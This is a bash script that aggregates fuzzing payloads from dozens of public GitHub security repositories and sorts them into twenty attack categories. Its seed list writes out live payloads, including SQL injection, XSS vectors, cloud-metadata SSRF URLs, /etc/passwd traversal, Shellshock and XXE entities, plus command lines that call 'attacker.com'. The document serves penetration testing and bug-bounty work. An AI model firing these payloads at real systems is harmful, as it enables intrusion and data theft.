#!/bin/bash

# ============================================================
# PAYLOAD-DP | Deep Recursive Aggregation Engine v3.0
# Uses GitHub Token (5000 req/hr) to crawl 90+ repos
# ============================================================

DATA_DIR="docs/data"
TEMP_DIR=".tmp_payloads"
MASTER_LIST="${DATA_DIR}/payloads.txt"
META_FILE="${DATA_DIR}/meta.json"
GITHUB_TOKEN="${GITHUB_TOKEN:-}"  # Set via env or Actions secret

mkdir -p "$DATA_DIR" "$TEMP_DIR"
rm -f "$TEMP_DIR"/*

# Build auth header for GitHub API (avoids 60/hr rate limit)
if [ -n "$GITHUB_TOKEN" ]; then
    AUTH_HEADER="-H \"Authorization: token ${GITHUB_TOKEN}\""
    echo "[*] GitHub Token: ACTIVE (5000 req/hr)"
else
    AUTH_HEADER=""
    echo "[*] GitHub Token: NONE (60 req/hr) - consider setting GITHUB_TOKEN"
fi

REPOS=(
    # ── CORE COLLECTIONS ──────────────────────────────────
    "swisskyrepo/PayloadsAllTheThings"
    "danielmiessler/SecLists"
    "fuzzdb-project/fuzzdb"
    "foospidy/payloads"
    "1N3/IntruderPayloads"
    "Bo0oM/fuzz.txt"
    "minimaxir/big-list-of-naughty-strings"
    "Karanxa/Bug-Bounty-Wordlists"
    "daffainfo/AllAboutBugBounty"
    "EdOverflow/bugbounty-cheatsheet"

    # ── PAYLOADBOX SUITE ──────────────────────────────────
    "payloadbox/xss-payload-list"
    "payloadbox/sql-injection-payload-list"
    "payloadbox/ssti-payloads"
    "payloadbox/command-injection-payload-list"
    "payloadbox/open-redirect-payload-list"
    "payloadbox/rfi-payload-list"
    "payloadbox/ssrf-payload-list"
    "payloadbox/path-traversal-payload-list"
    "payloadbox/redos-payload-list"

    # ── XSS ───────────────────────────────────────────────
    "s0md3v/AwesomeXSS"
    "cure53/H5SC"
    "terjanq/Tiny-XSS-Payloads"

    # ── SSRF ──────────────────────────────────────────────
    "tarunkant/Gf-Patterns"
    "PortSwigger/blind-ssrf-chains"

    # ── SSTI ──────────────────────────────────────────────
    "epinna/tplmap"

    # ── XXE ───────────────────────────────────────────────
    "BuffaloWill/oxml_xxe"
    "enjoiz/XXEinjector"

    # ── JWT ───────────────────────────────────────────────
    "wallarm/jwt-secrets"
    "ticarpi/jwt_tool"

    # ── PROTOTYPE POLLUTION ───────────────────────────────
    "BlackFan/client-side-prototype-pollution"

    # ── NOSQL ─────────────────────────────────────────────
    "codingo/NoSQLMap"

    # ── GRAPHQL ───────────────────────────────────────────
    "dolevf/Damn-Vulnerable-GraphQL-Application"

    # ── DESERIALIZATION ───────────────────────────────────
    "GrrrDog/Java-Deserialization-Cheat-Sheet"

    # ── CRLF ──────────────────────────────────────────────
    "Nefcore/CRLFsuite"

    # ── NUCLEI TEMPLATES ──────────────────────────────────
    "projectdiscovery/nuclei-templates"
    "projectdiscovery/fuzzing-templates"

    # ── WORDLISTS ─────────────────────────────────────────
    "six2dez/OneListForAll"
    "maurosoria/dirsearch"

    # ── API SECURITY ──────────────────────────────────────
    "OWASP/API-Security"

    # ── BUG BOUNTY ────────────────────────────────────────
    "random-robbie/bruteforce-lists"
    "KingOfBugbounty/KingOfBugBountyTips"
)

# ── SEED DATA (Professional Baseline) ──────────────────────
seed_data() {
    echo "[*] Injecting professional baseline seeds..."
    cat <<EOF >> "${TEMP_DIR}/new_master.txt"
' OR 1=1--
admin' --
' UNION SELECT NULL,NULL,NULL--
' OR SLEEP(5)--
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://127.0.0.1:80
/etc/passwd
../../../../../../etc/passwd
C:\windows\win.ini
php://filter/convert.base64-encode/resource=index.php
{{7*7}}
${7*7}
<%= 7*7 %>
; id;
\$(whoami)
| ping -c 3 attacker.com
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;
//google.com
https://google.com
/\google.com
{"\$gt": ""}
{"\$ne": null}
admin' || '1'=='1
*)(cn=*)
*)(&(uid=admin))
X-Forwarded-For: 127.0.0.1
User-Agent: () { :; }; echo; /bin/id
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
%0d%0aSet-Cookie:session=hacked
{__schema{types{name}}}
query { user { password } }
Origin: https://attacker.com
Access-Control-Allow-Origin: *
O:8:"Exploit":1:{s:4:"data";s:4:"test";}
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
__proto__[test]=test
constructor.prototype.test=test
169.254.169.254
aws_access_key_id
/wp-config.php
/wp-login.php
%2e%2e%2f
%252e%252e%252f
EOF
}

# ── FETCH FUNCTION ──────────────────────────────────────────
curl_github() {
    local url=$1
    if [ -n "$GITHUB_TOKEN" ]; then
        curl -s -H "Authorization: token ${GITHUB_TOKEN}" "$url"
    else
        curl -s "$url"
    fi
}

# ── RECURSIVE DISCOVERY ─────────────────────────────────────
discover_and_fetch() {
    local repo=$1
    echo "[*] Crawling: $repo"

    response=$(curl_github "https://api.github.com/repos/${repo}/git/trees/master?recursive=1")
    branch="master"
    if [[ "$response" == *"Not Found"* ]] || [[ "$response" == *'"message"'* ]]; then
        response=$(curl_github "https://api.github.com/repos/${repo}/git/trees/main?recursive=1")
        branch="main"
    fi

    while IFS= read -r file; do
        encoded_file=$(echo "$file" | sed 's/ /%20/g')
        raw_url="https://raw.githubusercontent.com/${repo}/${branch}/${encoded_file}"
        out_name=$(echo "$raw_url" | md5sum | cut -d' ' -f1)

        if curl -sSL -f --connect-timeout 8 --max-time 20 "$raw_url" -o "${TEMP_DIR}/${out_name}" 2>/dev/null; then
            cat "${TEMP_DIR}/${out_name}" | \
                tr -d '\r' | \
                tr '[:upper:]' '[:lower:]' | \
                sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
                sed '/^#/d; /^\/\//d; /^;/d' | \
                grep -avE "^<html|^<!doc|^404 |^error:|^---+$|^====|^\*\*\*" | \
                awk 'length($0) >= 3' \
                > "${TEMP_DIR}/${out_name}.clean"
        fi
        rm -f "${TEMP_DIR}/${out_name}"
    done < <(echo "$response" | grep -oP '"path": "\K[^"]+\.txt(?=")')
}

echo "[*] Starting crawl..."
if [[ "$1" != "--skip-crawl" ]]; then
    for repo in "${REPOS[@]}"; do
        discover_and_fetch "$repo"
    done
fi

# ── COMPILE MASTER ──────────────────────────────────────────
echo "[*] Compiling master database..."
seed_data
cat "$TEMP_DIR"/*.clean 2>/dev/null | sort -u >> "${TEMP_DIR}/new_master.txt"
sort -u "${TEMP_DIR}/new_master.txt" -o "${TEMP_DIR}/new_master.txt"

if [ ! -s "${TEMP_DIR}/new_master.txt" ]; then
    echo "[!] Empty dataset. Aborting."
    rm -rf "$TEMP_DIR"; exit 1
fi

TOTAL=$(wc -l < "${TEMP_DIR}/new_master.txt")
echo "[*] Total unique payloads: $TOTAL — extracting 20 categories..."

SRC="${TEMP_DIR}/new_master.txt"

# ── 20 CATEGORIES ───────────────────────────────────────────

# 1. SQLi
grep -iP "(select|union|insert|update|delete|drop|alter|exec)\b|sleep\s*\(|benchmark\s*\(|information_schema|pg_sleep|waitfor\s+delay|load_file|into\s+(outfile|dumpfile)|xp_cmdshell|cast\(|convert\(" "$SRC" | sort -u > "${DATA_DIR}/sqli.txt"

# 2. XSS
grep -iP "<script|alert\s*\(|prompt\s*\(|confirm\s*\(|onerror\s*=|onload\s*=|onclick\s*=|onmouse|onfocus|onblur|<svg|<img|<body|<input|<iframe|javascript:|data:text|expression\(|vbscript:" "$SRC" | sort -u > "${DATA_DIR}/xss.txt"

# 3. SSRF
grep -iP "169\.254\.169\.254|127\.0\.0\.|localhost|0\.0\.0\.0|internal|metadata\.google|instance-data|gopher://|dict://|file://|aws\.amazon|s3\.amazonaws|kubernetes" "$SRC" | sort -u > "${DATA_DIR}/ssrf.txt"

# 4. LFI
grep -iP "(\.\./){1,}|/etc/(passwd|shadow|group|hosts|crontab)|windows/(system32|win\.ini|boot\.ini|system\.ini)|/proc/(self|version|cmdline)|/var/log|/root/\." "$SRC" | sort -u > "${DATA_DIR}/lfi.txt"

# 5. SSTI
grep -iP "\{\{.{1,50}\}\}|%7b%7b|#\{.{1,50}\}|\$\{.{1,50}\}|<%=|<%.{1,50}%>|\$\{7\*7\}|\{\{7\*7\}\}|@\{" "$SRC" | sort -u > "${DATA_DIR}/ssti.txt"

# 6. RCE / Command Injection
grep -iP ";\s*(id|whoami|cat\s|ls\s|pwd|uname|curl\s|wget\s|bash|sh\s)|`(id|whoami|cat|ls)`|\$\((id|whoami|cat)\)|\|\s*(id|whoami|bash|nc\s|ncat)|(cmd|exec|system|passthru|popen)\s*\(" "$SRC" | sort -u > "${DATA_DIR}/rce.txt"

# 7. XXE
grep -iP "<!entity|<!doctype.{1,100}system|<!doctype.{1,100}public|file:///|expect://|php://input" "$SRC" | sort -u > "${DATA_DIR}/xxe.txt"

# 8. Open Redirect
grep -iP "^(//|https?://|/\\\\|%2f%2f|%5c%5c|\\\\)" "$SRC" | grep -ivP "localhost|127\.|raw\.github|cdn\." | sort -u > "${DATA_DIR}/redirect.txt"

# 9. NoSQL
grep -iP '\$where|\$gt|\$lt|\$ne|\$in|\$regex|\$exists|\$or|\$and|\$elemMatch|true,.*\|\||0;return|MongoClient|nosql' "$SRC" | sort -u > "${DATA_DIR}/nosql.txt"

# 10. LDAP
grep -iP "\*\)|%2a%29|\|\(|!\(|(uid|cn|dc|ou|objectclass)=|\)%28|\(\|" "$SRC" | sort -u > "${DATA_DIR}/ldap.txt"

# 11. HTTP Headers
grep -iP "^(x-forwarded-for|x-real-ip|x-originating-ip|host|x-host|forwarded|x-forwarded-host|x-remote-ip|cf-connecting-ip|true-client-ip):" "$SRC" | sort -u > "${DATA_DIR}/headers.txt"

# 12. JWT
grep -iP "eyj[a-z0-9_-]{10,}|alg.*none|hs256|rs256|bearer\s|jwt|\"typ\".*jwt" "$SRC" | sort -u > "${DATA_DIR}/jwt.txt"

# 13. CRLF / Header Injection
grep -iP "%0d%0a|%0a%0d|\\\\r\\\\n|\\\\n\\\\r|%0d|%0a|(set-cookie|location|content-type):" "$SRC" | sort -u > "${DATA_DIR}/crlf.txt"

# 14. GraphQL
grep -iP "__schema|__type|__typename|introspection|query\s*\{|mutation\s*\{|fragment\s+on|graphql|/graphql" "$SRC" | sort -u > "${DATA_DIR}/graphql.txt"

# 15. CORS
grep -iP "access-control-allow-(origin|credentials|methods)|null.{0,10}origin|origin:\s*https?://|withcredentials" "$SRC" | sort -u > "${DATA_DIR}/cors.txt"

# 16. Deserialization
grep -iP "rO0AB|aced0005|o:[0-9]+:|a:[0-9]+:|phpobject|java\.lang\.(runtime|processbuilder)|deserializ|pickle|marshal\.loads|yaml\.load" "$SRC" | sort -u > "${DATA_DIR}/deserial.txt"

# 17. Prototype Pollution
grep -iP "__proto__|constructor\.prototype|object\.prototype|\[\"__proto__\"\]|%5b__proto__%5d|proto\[" "$SRC" | sort -u > "${DATA_DIR}/pollution.txt"

# 18. Cloud Metadata
grep -iP "169\.254\.169\.254|metadata\.google|instance-data|imds|aws_access_key|aws_secret|s3\.amazonaws|storage\.googleapis|blob\.core\.windows|\.compute\.internal" "$SRC" | sort -u > "${DATA_DIR}/cloud.txt"

# 19. WordPress
grep -iP "wp-config|wp-admin|wp-login|wp-content|wp-includes|xmlrpc\.php|/wp-json|wordpress" "$SRC" | sort -u > "${DATA_DIR}/wordpress.txt"

# 20. Encoding / Bypass
grep -iP "^(%[0-9a-f]{2}){2,}|^0x[0-9a-f]+|&#x[0-9a-f]+;|\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|base64|%00|null\s*byte" "$SRC" | sort -u > "${DATA_DIR}/encoding.txt"

# ── FINALIZE ────────────────────────────────────────────────
mv "${TEMP_DIR}/new_master.txt" "$MASTER_LIST"
rm -rf "$TEMP_DIR"

TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
COUNT=$(wc -l < "$MASTER_LIST")

cat <<EOF > "$META_FILE"
{
  "last_updated": "$TIMESTAMP",
  "total_payloads": $COUNT,
  "repos_crawled": ${#REPOS[@]}
}
EOF

echo ""
echo "═══════════════════════════════════════"
echo " PAYLOAD-DP AGGREGATION COMPLETE"
echo "═══════════════════════════════════════"
echo " Total Payloads : $COUNT"
echo " SQLi           : $(wc -l < ${DATA_DIR}/sqli.txt)"
echo " XSS            : $(wc -l < ${DATA_DIR}/xss.txt)"
echo " SSRF           : $(wc -l < ${DATA_DIR}/ssrf.txt)"
echo " LFI            : $(wc -l < ${DATA_DIR}/lfi.txt)"
echo " SSTI           : $(wc -l < ${DATA_DIR}/ssti.txt)"
echo " RCE            : $(wc -l < ${DATA_DIR}/rce.txt)"
echo " XXE            : $(wc -l < ${DATA_DIR}/xxe.txt)"
echo " NoSQL          : $(wc -l < ${DATA_DIR}/nosql.txt)"
echo " JWT            : $(wc -l < ${DATA_DIR}/jwt.txt)"
echo " Repos Crawled  : ${#REPOS[@]}"
echo "═══════════════════════════════════════"
